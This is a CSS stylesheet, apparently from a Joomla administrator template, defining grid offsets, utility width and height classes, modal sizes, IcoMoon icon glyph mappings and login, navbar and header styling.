.row-fluid:hover .row-reveal {
	visibility: visible;
}
.btn-wide {
	width: 80%;
}
.nav-list > li.offset > a {
	padding-left: 30px;
	font-size: 12px;
}
.blog-row-rule,
.blog-item-rule {
	border: 0;
}
.row-fluid .offset1 {
	margin-left: 8.382978723%;
}
.row-fluid .offset2 {
	margin-left: 16.89361702%;
}
.row-fluid .offset3 {
	margin-left: 25.404255317%;
}
.row-fluid .offset4 {
	margin-left: 33.914893614%;
}
.row-fluid .offset5 {
	margin-left: 42.425531911%;
}
.row-fluid .offset6 {
	margin-left: 50.93617020799999%;
}
.row-fluid .offset7 {
	margin-left: 59.446808505%;
}
.row-fluid .offset8 {
	margin-left: 67.95744680199999%;
}
.row-fluid .offset9 {
	margin-left: 76.468085099%;
}
.row-fluid .offset10 {
	margin-left: 84.97872339599999%;
}
.row-fluid .offset11 {
	margin-left: 91.489361693%;
}
.navbar .nav > li > a.btn {
	padding: 4px 10px;
	line-height: 18px;
}
.nav-tabs.nav-dark {
	border-bottom: 1px solid #333;
	text-shadow: 1px 1px 1px #000;
}
.nav-tabs.nav-dark > li > a {
	color: #F8F8F8;
}
.nav-tabs.nav-dark > li > a:hover {
	border-color: #333 #333 #111;
	background-color: #777777;
}
.nav-tabs.nav-dark > .active > a,
.nav-tabs.nav-dark > .active > a:hover {
	color: #ffffff;
	background-color: #555555;
	border: 1px solid #222;
	border-bottom-color: transparent;
}
.thumbnail.pull-left {
	margin: 0 10px 10px 0;
}
.thumbnail.pull-right {
	margin: 0 0 10px 10px;
}
.width-10 {
	width: 10px;
}
.width-20 {
	width: 20px;
}
.width-30 {
	width: 30px;
}
.width-40 {
	width: 40px;
}
.width-50 {
	width: 50px;
}
.width-60 {
	width: 60px;
}
.width-70 {
	width: 70px;
}
.width-80 {
	width: 80px;
}
.width-90 {
	width: 90px;
}
.width-100 {
	width: 100px;
}
.height-10 {
	height: 10px;
}
.height-20 {
	height: 20px;
}
.height-30 {
	height: 30px;
}
.height-40 {
	height: 40px;
}
.height-50 {
	height: 50px;
}
.height-60 {
	height: 60px;
}
.height-70 {
	height: 70px;
}
.height-80 {
	height: 80px;
}
.height-90 {
	height: 90px;
}
.height-100 {
	height: 100px;
}
hr.hr-condensed {
	margin: 10px 0;
}
.list-striped,
.row-striped {
	list-style: none;
	line-height: 18px;
	text-align: left;
	vertical-align: middle;
	border-top: 1px solid #ddd;
	margin-left: 0;
}
.list-striped li,
.list-striped dd,
.row-striped .row,
.row-striped .row-fluid {
	border-bottom: 1px solid #ddd;
	padding: 8px;
}
.list-striped li:nth-child(odd),
.list-striped dd:nth-child(odd),
.row-striped .row:nth-child(odd),
.row-striped .row-fluid:nth-child(odd) {
	background-color: #f9f9f9;
}
.list-striped li:hover,
.list-striped dd:hover,
.row-striped .row:hover,
.row-striped .row-fluid:hover {
	background-color: #f5f5f5;
}
.row-striped .row-fluid {
	width: 100%;
	box-sizing: border-box;
}
.row-striped .row-fluid [class*="span"] {
	min-height: 10px;
}
.row-striped .row-fluid [class*="span"] {
	margin-left: 8px;
}
.row-striped .row-fluid [class*="span"]:first-child {
	margin-left: 0;
}
.list-condensed li {
	padding: 4px 5px;
}
.row-condensed .row,
.row-condensed .row-fluid {
	padding: 4px 5px;
}
.list-bordered,
.row-bordered {
	list-style: none;
	line-height: 18px;
	text-align: left;
	vertical-align: middle;
	margin-left: 0;
	border: 1px solid #ddd;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.radio.btn-group input[type=radio] {
	display: none;
}
.radio.btn-group > label:first-of-type {
	margin-left: 0;
	-webkit-border-bottom-left-radius: 4px;
	border-bottom-left-radius: 4px;
	-webkit-border-top-left-radius: 4px;
	border-top-left-radius: 4px;
	-moz-border-radius-bottomleft: 4px;
	-moz-border-radius-topleft: 4px;
}
fieldset.radio.btn-group {
	padding-left: 0;
}
.iframe-bordered {
	border: 1px solid #ddd;
}
.tab-content {
	overflow: visible;
}
.tabs-left .tab-content {
	overflow: auto;
}
.nav-tabs > li > span {
	display: block;
	margin-right: 2px;
	padding-right: 12px;
	padding-left: 12px;
	padding-top: 8px;
	padding-bottom: 8px;
	line-height: 18px;
	border: 1px solid transparent;
	-webkit-border-radius: 4px 4px 0 0;
	-moz-border-radius: 4px 4px 0 0;
	border-radius: 4px 4px 0 0;
}
.btn-micro {
	padding: 1px 4px;
	font-size: 10px;
	line-height: 8px;
}
.btn-group > .btn-micro {
	font-size: 10px;
}
.tip-wrap {
	max-width: 200px;
	padding: 3px 8px;
	color: #fff;
	text-align: center;
	text-decoration: none;
	background-color: #000;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
	z-index: 100;
}
.page-header {
	margin: 2px 0px 10px 0px;
	padding-bottom: 5px;
}
.input-prepend .chzn-container-single .chzn-single,
.input-append .chzn-container-single .chzn-single {
	border-color: #ccc;
	height: 26px;
	-moz-box-shadow: none;
	-webkit-box-shadow: none;
	box-shadow: none;
}
.input-prepend .chzn-container-single .chzn-drop,
.input-append .chzn-container-single .chzn-drop {
	border-color: #ccc;
}
.input-prepend > .add-on,
.input-append > .add-on {
	vertical-align: top;
}
.input-prepend .chzn-container-single .chzn-single {
	-webkit-border-radius: 0 3px 3px 0;
	-moz-border-radius: 0 3px 3px 0;
	border-radius: 0 3px 3px 0;
}
.input-prepend .chzn-container-single .chzn-single-with-drop {
	-webkit-border-radius: 0 3px 0 0;
	-moz-border-radius: 0 3px 0 0;
	border-radius: 0 3px 0 0;
}
.input-append .chzn-container-single .chzn-single {
	-webkit-border-radius: 3px 0 0 3px;
	-moz-border-radius: 3px 0 0 3px;
	border-radius: 3px 0 0 3px;
}
.input-append .chzn-container-single .chzn-single-with-drop {
	-webkit-border-radius: 3px 0 0 0;
	-moz-border-radius: 3px 0 0 0;
	border-radius: 3px 0 0 0;
}
.input-prepend.input-append .chzn-container-single .chzn-single,
.input-prepend.input-append .chzn-container-single .chzn-single-with-drop {
	-webkit-border-radius: 0;
	-moz-border-radius: 0;
	border-radius: 0;
}
.element-invisible {
	position: absolute;
	padding: 0;
	margin: 0;
	border: 0;
	height: 1px;
	width: 1px;
	overflow: hidden;
}
.element-invisible:focus {
	width: auto;
	height: auto;
	overflow: auto;
	background: #eee;
	color: #000;
	padding: 1em;
}
.form-vertical .control-label {
	float: none;
	width: auto;
	padding-right: 0;
	padding-top: 0;
	text-align: left;
}
.form-vertical .controls {
	margin-left: 0;
}
.width-auto {
	width: auto;
}
.btn-group .chzn-results {
	white-space: normal;
}
.accordion-body.in:hover {
	overflow: visible;
}
.invalid {
	color: #9d261d;
	font-weight: bold;
}
input.invalid {
	border: 1px solid #9d261d;
}
select.chzn-done.invalid + .chzn-container.chzn-container-single > a.chzn-single,
select.chzn-done.invalid + .chzn-container.chzn-container-multi > ul.chzn-choices {
	border-color: #9d261d;
	color: #9d261d;
}
.tooltip {
	max-width: 400px;
}
.tooltip-inner {
	max-width: none;
	text-align: left;
	text-shadow: none;
}
th .tooltip-inner {
	font-weight: normal;
}
.tooltip.hasimage {
	opacity: 1;
}
.tip-text {
	text-align: left;
}
.btn-group > .btn + .dropdown-backdrop + .btn {
	margin-left: -1px;
}
.btn-group > .btn + .dropdown-backdrop + .dropdown-toggle {
	padding-left: 8px;
	padding-right: 8px;
	-webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.125), inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	-moz-box-shadow: inset 1px 0 0 rgba(255,255,255,.125), inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	box-shadow: inset 1px 0 0 rgba(255,255,255,.125), inset 0 1px 0 rgba(255,255,255,.2), 0 1px 2px rgba(0,0,0,.05);
	*padding-top: 5px;
	*padding-bottom: 5px;
}
.btn-group > .btn-mini + .dropdown-backdrop + .dropdown-toggle {
	padding-left: 5px;
	padding-right: 5px;
	*padding-top: 2px;
	*padding-bottom: 2px;
}
.btn-group > .btn-small + .dropdown-backdrop + .dropdown-toggle {
	*padding-top: 5px;
	*padding-bottom: 4px;
}
.btn-group > .btn-large + .dropdown-backdrop + .dropdown-toggle {
	padding-left: 12px;
	padding-right: 12px;
	*padding-top: 7px;
	*padding-bottom: 7px;
}
.dropdown-menu {
	text-align: left;
}
.alert-link {
	font-weight: bold;
}
.alert .alert-link {
	color: #66512c;
}
.alert-success .alert-link {
	color: #2b542c;
}
.alert-danger .alert-link,
.alert-error .alert-link {
	color: #843534;
}
.alert-info .alert-link {
	color: #245269;
}
div.modal {
	position: fixed;
	top: 5%;
	left: 50%;
	z-index: 1050;
	width: 80%;
	margin-left: -40%;
	background-color: #fff;
	border: 1px solid #999;
	border: 1px solid rgba(0,0,0,0.3);
	*border: 1px solid #999;
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
	-webkit-box-shadow: 0 3px 7px rgba(0,0,0,0.3);
	-moz-box-shadow: 0 3px 7px rgba(0,0,0,0.3);
	box-shadow: 0 3px 7px rgba(0,0,0,0.3);
	-webkit-background-clip: padding-box;
	-moz-background-clip: padding-box;
	background-clip: padding-box;
	outline: none;
}
div.modal.fade {
	-webkit-transition: opacity .3s linear, top .3s ease-out;
	-moz-transition: opacity .3s linear, top .3s ease-out;
	-o-transition: opacity .3s linear, top .3s ease-out;
	transition: opacity .3s linear, top .3s ease-out;
	top: -25%;
}
div.modal.fade.in {
	top: 5%;
}
.modal-batch {
	overflow-y: visible;
}
.modal-body[class^="jviewport-height"],
.modal-body[class*="jviewport-height"] {
	max-height: none;
}
.jviewport-height10 {
	height: 10vh;
}
.jviewport-height20 {
	height: 20vh;
}
.jviewport-height30 {
	height: 30vh;
}
.jviewport-height40 {
	height: 40vh;
}
.jviewport-height50 {
	height: 50vh;
}
.jviewport-height60 {
	height: 60vh;
}
.jviewport-height70 {
	height: 70vh;
}
.jviewport-height80 {
	height: 80vh;
}
.jviewport-height90 {
	height: 90vh;
}
.jviewport-height100 {
	height: 100vh;
}
div.modal.jviewport-width10 {
	width: 10vw;
	margin-left: -5vw;
}
div.modal.jviewport-width20 {
	width: 20vw;
	margin-left: -10vw;
}
div.modal.jviewport-width30 {
	width: 30vw;
	margin-left: -15vw;
}
div.modal.jviewport-width40 {
	width: 40vw;
	margin-left: -20vw;
}
div.modal.jviewport-width50 {
	width: 50vw;
	margin-left: -25vw;
}
div.modal.jviewport-width60 {
	width: 60vw;
	margin-left: -30vw;
}
div.modal.jviewport-width70 {
	width: 70vw;
	margin-left: -35vw;
}
div.modal.jviewport-width80 {
	width: 80vw;
	margin-left: -40vw;
}
div.modal.jviewport-width90 {
	width: 90vw;
	margin-left: -45vw;
}
div.modal.jviewport-width100 {
	width: 100vw;
	margin-left: -50vw;
}
@media (max-width: 767px) {
	div.modal {
		position: fixed;
		top: 20px;
		left: 20px;
		right: 20px;
		width: auto;
		margin: 0;
	}
	div.modal.fade {
		top: -100px;
	}
	div.modal.fade.in {
		top: 20px;
	}
	div.modal[class*="jviewport-width"] {
		width: auto;
		margin: 0;
	}
}
@media (max-width: 480px) {
	div.modal {
		top: 10px;
		left: 10px;
		right: 10px;
	}
}
@font-face {
	font-family: 'IcoMoon';
	src: url('../../../../media/jui/fonts/IcoMoon.eot');
	src: url('../../../../media/jui/fonts/IcoMoon.eot?#iefix') format('embedded-opentype'), url('../../../../media/jui/fonts/IcoMoon.woff') format('woff'), url('../../../../media/jui/fonts/IcoMoon.ttf') format('truetype'), url('../../../../media/jui/fonts/IcoMoon.svg#IcoMoon') format('svg');
	font-weight: normal;
	font-style: normal;
}
[data-icon]:before {
	font-family: 'IcoMoon';
	content: attr(data-icon);
	speak: none;
}
[class^="icon-"],
[class*=" icon-"] {
	display: inline-block;
	width: 14px;
	height: 14px;
	margin-right: .25em;
	line-height: 14px;
}
[class^="icon-"]:before,
[class*=" icon-"]:before {
	font-family: 'IcoMoon';
	font-style: normal;
	speak: none;
}
[class^="icon-"].disabled,
[class*=" icon-"].disabled {
	font-weight: normal;
}
.icon-joomla:before {
	content: "\e200";
}
.icon-chevron-up:before,
.icon-uparrow:before,
.icon-arrow-up:before {
	content: "\e005";
}
.icon-chevron-right:before,
.icon-rightarrow:before,
.icon-arrow-right:before {
	content: "\e006";
}
.icon-chevron-down:before,
.icon-downarrow:before,
.icon-arrow-down:before {
	content: "\e007";
}
.icon-chevron-left:before,
.icon-leftarrow:before,
.icon-arrow-left:before {
	content: "\e008";
}
.icon-arrow-first:before {
	content: "\e003";
}
.icon-arrow-last:before {
	content: "\e004";
}
.icon-arrow-up-2:before {
	content: "\e009";
}
.icon-arrow-right-2:before {
	content: "\e00a";
}
.icon-arrow-down-2:before {
	content: "\e00b";
}
.icon-arrow-left-2:before {
	content: "\e00c";
}
.icon-arrow-up-3:before {
	content: "\e00f";
}
.icon-arrow-right-3:before {
	content: "\e010";
}
.icon-arrow-down-3:before {
	content: "\e011";
}
.icon-arrow-left-3:before {
	content: "\e012";
}
.icon-menu-2:before {
	content: "\e00e";
}
.icon-arrow-up-4:before {
	content: "\e201";
}
.icon-arrow-right-4:before {
	content: "\e202";
}
.icon-arrow-down-4:before {
	content: "\e203";
}
.icon-arrow-left-4:before {
	content: "\e204";
}
.icon-share:before,
.icon-redo:before {
	content: "\27";
}
.icon-undo:before {
	content: "\28";
}
.icon-forward-2:before {
	content: "\e205";
}
.icon-backward-2:before,
.icon-reply:before {
	content: "\e206";
}
.icon-unblock:before,
.icon-refresh:before,
.icon-redo-2:before {
	content: "\6c";
}
.icon-undo-2:before {
	content: "\e207";
}
.icon-move:before {
	content: "\7a";
}
.icon-expand:before {
	content: "\66";
}
.icon-contract:before {
	content: "\67";
}
.icon-expand-2:before {
	content: "\68";
}
.icon-contract-2:before {
	content: "\69";
}
.icon-play:before {
	content: "\e208";
}
.icon-pause:before {
	content: "\e209";
}
.icon-stop:before {
	content: "\e210";
}
.icon-previous:before,
.icon-backward:before {
	content: "\7c";
}
.icon-next:before,
.icon-forward:before {
	content: "\7b";
}
.icon-first:before {
	content: "\7d";
}
.icon-last:before {
	content: "\e000";
}
.icon-play-circle:before {
	content: "\e00d";
}
.icon-pause-circle:before {
	content: "\e211";
}
.icon-stop-circle:before {
	content: "\e212";
}
.icon-backward-circle:before {
	content: "\e213";
}
.icon-forward-circle:before {
	content: "\e214";
}
.icon-loop:before {
	content: "\e001";
}
.icon-shuffle:before {
	content: "\e002";
}
.icon-search:before {
	content: "\53";
}
.icon-zoom-in:before {
	content: "\64";
}
.icon-zoom-out:before {
	content: "\65";
}
.icon-apply:before,
.icon-edit:before,
.icon-pencil:before {
	content: "\2b";
}
.icon-pencil-2:before {
	content: "\2c";
}
.icon-brush:before {
	content: "\3b";
}
.icon-save-new:before,
.icon-plus-2:before {
	content: "\5d";
}
.icon-minus-sign:before,
.icon-minus-2:before {
	content: "\5e";
}
.icon-delete:before,
.icon-remove:before,
.icon-cancel-2:before {
	content: "\49";
}
.icon-publish:before,
.icon-save:before,
.icon-ok:before,
.icon-checkmark:before {
	content: "\47";
}
.icon-new:before,
.icon-plus:before {
	content: "\2a";
}
.icon-plus-circle:before {
	content: "\e215";
}
.icon-minus:before,
.icon-not-ok:before {
	content: "\4b";
}
.icon-ban-circle:before,
.icon-minus-circle:before {
	content: "\e216";
}
.icon-unpublish:before,
.icon-cancel:before {
	content: "\4a";
}
.icon-cancel-circle:before {
	content: "\e217";
}
.icon-checkmark-2:before {
	content: "\e218";
}
.icon-checkmark-circle:before {
	content: "\e219";
}
.icon-info:before {
	content: "\e220";
}
.icon-info-2:before,
.icon-info-circle:before {
	content: "\e221";
}
.icon-question:before,
.icon-question-sign:before,
.icon-help:before {
	content: "\45";
}
.icon-question-2:before,
.icon-question-circle:before {
	content: "\e222";
}
.icon-notification:before {
	content: "\e223";
}
.icon-notification-2:before,
.icon-notification-circle:before {
	content: "\e224";
}
.icon-pending:before,
.icon-warning:before {
	content: "\48";
}
.icon-warning-2:before,
.icon-warning-circle:before {
	content: "\e225";
}
.icon-checkbox-unchecked:before {
	content: "\3d";
}
.icon-checkin:before,
.icon-checkbox:before,
.icon-checkbox-checked:before {
	content: "\3e";
}
.icon-checkbox-partial:before {
	content: "\3f";
}
.icon-square:before {
	content: "\e226";
}
.icon-radio-unchecked:before {
	content: "\e227";
}
.icon-radio-checked:before,
.icon-generic:before {
	content: "\e228";
}
.icon-circle:before {
	content: "\e229";
}
.icon-signup:before {
	content: "\e230";
}
.icon-grid:before,
.icon-grid-view:before {
	content: "\58";
}
.icon-grid-2:before,
.icon-grid-view-2:before {
	content: "\59";
}
.icon-menu:before {
	content: "\5a";
}
.icon-list:before,
.icon-list-view:before {
	content: "\31";
}
.icon-list-2:before {
	content: "\e231";
}
.icon-menu-3:before {
	content: "\e232";
}
.icon-folder-open:before,
.icon-folder:before {
	content: "\2d";
}
.icon-folder-close:before,
.icon-folder-2:before {
	content: "\2e";
}
.icon-folder-plus:before {
	content: "\e234";
}
.icon-folder-minus:before {
	content: "\e235";
}
.icon-folder-3:before {
	content: "\e236";
}
.icon-folder-plus-2:before {
	content: "\e237";
}
.icon-folder-remove:before {
	content: "\e238";
}
.icon-file:before {
	content: "\e016";
}
.icon-file-2:before {
	content: "\e239";
}
.icon-file-add:before,
.icon-file-plus:before {
	content: "\29";
}
.icon-file-minus:before {
	content: "\e017";
}
.icon-file-check:before {
	content: "\e240";
}
.icon-file-remove:before {
	content: "\e241";
}
.icon-save-copy:before,
.icon-copy:before {
	content: "\e018";
}
.icon-stack:before {
	content: "\e242";
}
.icon-tree:before {
	content: "\e243";
}
.icon-tree-2:before {
	content: "\e244";
}
.icon-paragraph-left:before {
	content: "\e246";
}
.icon-paragraph-center:before {
	content: "\e247";
}
.icon-paragraph-right:before {
	content: "\e248";
}
.icon-paragraph-justify:before {
	content: "\e249";
}
.icon-screen:before {
	content: "\e01c";
}
.icon-tablet:before {
	content: "\e01d";
}
.icon-mobile:before {
	content: "\e01e";
}
.icon-box-add:before {
	content: "\51";
}
.icon-box-remove:before {
	content: "\52";
}
.icon-download:before {
	content: "\e021";
}
.icon-upload:before {
	content: "\e022";
}
.icon-home:before {
	content: "\21";
}
.icon-home-2:before {
	content: "\e250";
}
.icon-out-2:before,
.icon-new-tab:before {
	content: "\e024";
}
.icon-out-3:before,
.icon-new-tab-2:before {
	content: "\e251";
}
.icon-link:before {
	content: "\e252";
}
.icon-picture:before,
.icon-image:before {
	content: "\2f";
}
.icon-pictures:before,
.icon-images:before {
	content: "\30";
}
.icon-palette:before,
.icon-color-palette:before {
	content: "\e014";
}
.icon-camera:before {
	content: "\55";
}
.icon-camera-2:before,
.icon-video:before {
	content: "\e015";
}
.icon-play-2:before,
.icon-video-2:before,
.icon-youtube:before {
	content: "\56";
}
.icon-music:before {
	content: "\57";
}
.icon-user:before {
	content: "\22";
}
.icon-users:before {
	content: "\e01f";
}
.icon-vcard:before {
	content: "\6d";
}
.icon-address:before {
	content: "\70";
}
.icon-share-alt:before,
.icon-out:before {
	content: "\26";
}
.icon-enter:before {
	content: "\e257";
}
.icon-exit:before {
	content: "\e258";
}
.icon-comment:before,
.icon-comments:before {
	content: "\24";
}
.icon-comments-2:before {
	content: "\25";
}
.icon-quote:before,
.icon-quotes-left:before {
	content: "\60";
}
.icon-quote-2:before,
.icon-quotes-right:before {
	content: "\61";
}
.icon-quote-3:before,
.icon-bubble-quote:before {
	content: "\e259";
}
.icon-phone:before {
	content: "\e260";
}
.icon-phone-2:before {
	content: "\e261";
}
.icon-envelope:before,
.icon-mail:before {
	content: "\4d";
}
.icon-envelope-opened:before,
.icon-mail-2:before {
	content: "\4e";
}
.icon-unarchive:before,
.icon-drawer:before {
	content: "\4f";
}
.icon-archive:before,
.icon-drawer-2:before {
	content: "\50";
}
.icon-briefcase:before {
	content: "\e020";
}
.icon-tag:before {
	content: "\e262";
}
.icon-tag-2:before {
	content: "\e263";
}
.icon-tags:before {
	content: "\e264";
}
.icon-tags-2:before {
	content: "\e265";
}
.icon-options:before,
.icon-cog:before {
	content: "\38";
}
.icon-cogs:before {
	content: "\37";
}
.icon-screwdriver:before,
.icon-tools:before {
	content: "\36";
}
.icon-wrench:before {
	content: "\3a";
}
.icon-equalizer:before {
	content: "\39";
}
.icon-dashboard:before {
	content: "\78";
}
.icon-switch:before {
	content: "\e266";
}
.icon-filter:before {
	content: "\54";
}
.icon-purge:before,
.icon-trash:before {
	content: "\4c";
}
.icon-checkedout:before,
.icon-lock:before,
.icon-locked:before {
	content: "\23";
}
.icon-unlock:before {
	content: "\e267";
}
.icon-key:before {
	content: "\5f";
}
.icon-support:before {
	content: "\46";
}
.icon-database:before {
	content: "\62";
}
.icon-scissors:before {
	content: "\e268";
}
.icon-health:before {
	content: "\6a";
}
.icon-wand:before {
	content: "\6b";
}
.icon-eye-open:before,
.icon-eye:before {
	content: "\3c";
}
.icon-eye-close:before,
.icon-eye-blocked:before,
.icon-eye-2:before {
	content: "\e269";
}
.icon-clock:before {
	content: "\6e";
}
.icon-compass:before {
	content: "\6f";
}
.icon-broadcast:before,
.icon-connection:before,
.icon-wifi:before {
	content: "\e01b";
}
.icon-book:before {
	content: "\e271";
}
.icon-lightning:before,
.icon-flash:before {
	content: "\79";
}
.icon-print:before,
.icon-printer:before {
	content: "\e013";
}
.icon-feed:before {
	content: "\71";
}
.icon-calendar:before {
	content: "\43";
}
.icon-calendar-2:before {
	content: "\44";
}
.icon-calendar-3:before {
	content: "\e273";
}
.icon-pie:before {
	content: "\77";
}
.icon-bars:before {
	content: "\76";
}
.icon-chart:before {
	content: "\75";
}
.icon-power-cord:before {
	content: "\32";
}
.icon-cube:before {
	content: "\33";
}
.icon-puzzle:before {
	content: "\34";
}
.icon-attachment:before,
.icon-paperclip:before,
.icon-flag-2:before {
	content: "\72";
}
.icon-lamp:before {
	content: "\74";
}
.icon-pin:before,
.icon-pushpin:before {
	content: "\73";
}
.icon-location:before {
	content: "\63";
}
.icon-shield:before {
	content: "\e274";
}
.icon-flag:before {
	content: "\35";
}
.icon-flag-3:before {
	content: "\e275";
}
.icon-bookmark:before {
	content: "\e023";
}
.icon-bookmark-2:before {
	content: "\e276";
}
.icon-heart:before {
	content: "\e277";
}
.icon-heart-2:before {
	content: "\e278";
}
.icon-thumbs-up:before {
	content: "\5b";
}
.icon-thumbs-down:before {
	content: "\5c";
}
.icon-unfeatured:before,
.icon-asterisk:before,
.icon-star-empty:before {
	content: "\40";
}
.icon-star-2:before {
	content: "\41";
}
.icon-featured:before,
.icon-default:before,
.icon-star:before {
	content: "\42";
}
.icon-smiley:before,
.icon-smiley-happy:before {
	content: "\e279";
}
.icon-smiley-2:before,
.icon-smiley-happy-2:before {
	content: "\e280";
}
.icon-smiley-sad:before {
	content: "\e281";
}
.icon-smiley-sad-2:before {
	content: "\e282";
}
.icon-smiley-neutral:before {
	content: "\e283";
}
.icon-smiley-neutral-2:before {
	content: "\e284";
}
.icon-cart:before {
	content: "\e019";
}
.icon-basket:before {
	content: "\e01a";
}
.icon-credit:before {
	content: "\e286";
}
.icon-credit-2:before {
	content: "\e287";
}
.icon-expired:before {
	content: "\4b";
}
.icon-edit:before {
	color: #24748c;
}
.icon-publish:before,
.icon-save:before,
.icon-ok:before,
.icon-save-new:before,
.icon-save-copy:before,
.btn-toolbar .icon-copy:before {
	color: #378137;
}
.icon-unpublish:before,
.icon-not-ok:before,
.icon-eye-close:before,
.icon-ban-circle:before,
.icon-minus-sign:before,
.btn-toolbar .icon-cancel:before {
	color: #942a25;
}
.icon-featured:before,
.icon-default:before,
.icon-expired:before,
.icon-pending:before {
	color: #c67605;
}
.icon-back:before {
	content: "\e008";
}
html {
	height: 100%;
}
body {
	height: 100%;
	-webkit-font-smoothing: antialiased;
	-moz-osx-font-smoothing: grayscale;
}
a:hover,
a:active,
a:focus {
	outline: none;
}
.view-login {
	background-color: #17568c;
	padding-top: 0;
}
.view-login .container {
	width: 300px;
	position: absolute;
	top: 50%;
	left: 50%;
	margin-top: -206px;
	margin-left: -150px;
}
.view-login .navbar-fixed-bottom {
	padding-left: 20px;
	padding-right: 20px;
	text-align: center;
}
.view-login .navbar-fixed-bottom,
.view-login .navbar-fixed-bottom a {
	color: #FCFCFC;
}
.view-login .navbar-inverse.navbar-fixed-bottom,
.view-login .navbar-inverse.navbar-fixed-bottom a {
	color: #555;
}
.view-login .well {
	padding-bottom: 0;
}
.view-login .login-joomla {
	position: absolute;
	left: 50%;
	height: 24px;
	width: 24px;
	margin-left: -12px;
	font-size: 22px;
}
.view-login .navbar-fixed-bottom {
	position: absolute;
}
.view-login .input-medium {
	width: 176px;
}
.navbar-inverse {
	color: #333;
}
.login .chzn-single {
	width: 222px !important;
}
.login .chzn-container,
.login .chzn-drop {
	width: 230px !important;
	max-width: 230px !important;
}
.login .btn-large {
	margin-top: 15px;
}
.login .form-inline .btn-group {
	display: block;
}
.small {
	font-size: 11px;
}
.row-even .small,
.row-odd .small,
.row-even .small a,
.row-odd .small a {
	color: #888;
}
body .navbar,
body .navbar-fixed-top {
	margin-bottom: 0;
}
.navbar-inner {
	min-height: 0;
	background: #f2f2f2;
	background-image: none;
	filter: none;
}
.navbar-inner .container-fluid {
	padding-left: 10px;
	padding-right: 10px;
	font-size: 15px;
}
.navbar-inverse .navbar-inner {
	background: #10223e;
	background-image: none;
	filter: none;
}
.navbar .navbar-text {
	line-height: 30px;
}
.navbar .admin-logo {
	float: left;
	padding: 7px 12px 0px 15px;
	font-size: 16px;
	color: #555;
}
.navbar .admin-logo:hover {
	color: #333;
}
.navbar-inverse.navbar .admin-logo {
	color: #d9d9d9;
}
.navbar-inverse.navbar .admin-logo:hover {
	color: #ffffff;
}
.navbar .brand {
	float: right;
	display: block;
	padding: 6px 10px;
	margin-left: -20px;
	font-size: inherit;
	font-weight: normal;
}
.navbar .brand:hover,
.navbar .brand:focus {
	text-decoration: none;
}
.navbar .nav > li > a {
	padding: 6px 10px;
}
.navbar .dropdown-menu,
.navbar .nav-user {
	font-size: 13px;
}
.navbar .nav > li ul {
	overflow-y: auto;
	overflow-x: hidden;
	-webkit-overflow-scrolling: touch;
	-moz-overflow-scrolling: touch;
	-ms-overflow-scrolling: touch;
	-o-overflow-scrolling: touch;
	overflow-scrolling: touch;
	height: auto;
	max-height: 500px;
	margin: 0;
}
.navbar .nav > li ul::-webkit-scrollbar {
	-webkit-appearance: none;
	width: 7px;
}
.navbar .nav > li ul::-webkit-scrollbar-thumb {
	border-radius: 4px;
	background-color: rgba(0,0,0,0.5);
	-webkit-box-shadow: 0 0 1px rgba(255,255,255,0.5);
}
.navbar .nav > li > .dropdown-menu:after {
	display: none;
}
.navbar .nav > .dropdown.open:after {
	content: '';
	display: inline-block;
	border-left: 6px solid transparent;
	border-right: 6px solid transparent;
	border-bottom: 6px solid #fff;
	position: absolute;
	top: 25px;
	left: 10px;
	z-index: 1001;
}
.navbar .empty-nav {
	display: none;
}
.navbar-fixed-top .navbar-inner,
.navbar-static-top .navbar-inner {
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
	box-shadow: none;
}
.navbar-fixed-bottom {
	bottom: 0;
}
.navbar-fixed-bottom .navbar-inner {
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
	box-shadow: none;
}
.header {
	background-color: #1a3867;
	border-top: 1px solid rgba(255,255,255,0.2);
	padding: 5px 25px;
}
.navbar .btn-navbar {
	background: #17568c;
	border: 1px solid #0D2242;
	margin-bottom: 2px;
}
@media (max-width: 767px) {
	.header {
		padding: 4px 18px;
		margin-left: -20px;
		margin-right: -20px;
	}
	.navbar .admin-logo {
		margin-left: 10px;
		padding: 9px 9px 0 9px;
	}
}
.header .navbar-search {
	margin-top: 0;
}
@media (max-width: 979px) {
	.header .navbar-search {
		border-top: 0;
		border-bottom: 0;
		-webkit-box-shadow: none;
		-moz-box-shadow: none;
		box-shadow: none;
	}
}
.navbar-search .search-query {
	background: rgba(255,255,255,0.3);
}
.container-logo {
	float: right;
	text-align: right;
}
.logo {
	width: auto;
	max-width: 100%;
	max-height: 36px;
	height: auto;
}
.page-title {
	color: white;
	font-weight: normal;
	font-size: 20px;
	line-height: 36px;
	margin: 0;
}
.page-title [class^="icon-"],
.page-title [class*=" icon-"] {
	margin-right: 16px;
}
@media (max-width: 767px) {
	.container-logo {
		display: none;
	}
	.page-title {
		font-size: 18px;
		line-height: 28px;
	}
	.page-title [class^="icon-"],
	.page-title [class*=" icon-"] {
		margin-right: 10px;
	}
}
.content-title {
	font-size: 24px;
	font-weight: normal;
	line-height: 26px;
	margin-top: 0;
}
.subhead {
	background: #f5f5f5;
	border-bottom: 1px solid #e3e3e3;
	color: #0C192E;
	text-shadow: 0 1px 0 #FFF;
	margin-bottom: 10px;
	min-height: 43px;
}
.subhead-collapse {
	margin-bottom: 11px;
}
.subhead-collapse.collapse {
	height: auto;
	overflow: visible;
}
.btn-toolbar {
	margin-bottom: 5px;
}
.btn-toolbar .btn-wrapper {
	display: inline-block;
	margin: 0 0 5px 5px;
}
.subhead-fixed {
	position: fixed;
	width: 100%;
	top: 30px;
	z-index: 100;
}
@media (max-width: 767px) {
	body {
		-webkit-overflow-scrolling: touch;
	}
	.subhead {
		margin-left: -20px;
		margin-right: -20px;
		padding-left: 10px;
		padding-right: 10px;
	}
}
.subhead h1 {
	font-size: 17px;
	font-weight: normal;
	margin-left: 10px;
	margin-top: 6px;
}
#toolbar .btn-success {
	width: 148px;
}
#toolbar #toolbar-options,
#toolbar #toolbar-help {
	float: right;
}
html[dir=rtl] #toolbar #toolbar-options,
html[dir=rtl] #toolbar #toolbar-help {
	float: left;
}
.well .page-header {
	margin: -10px 0 18px 0;
	padding-bottom: 5px;
}
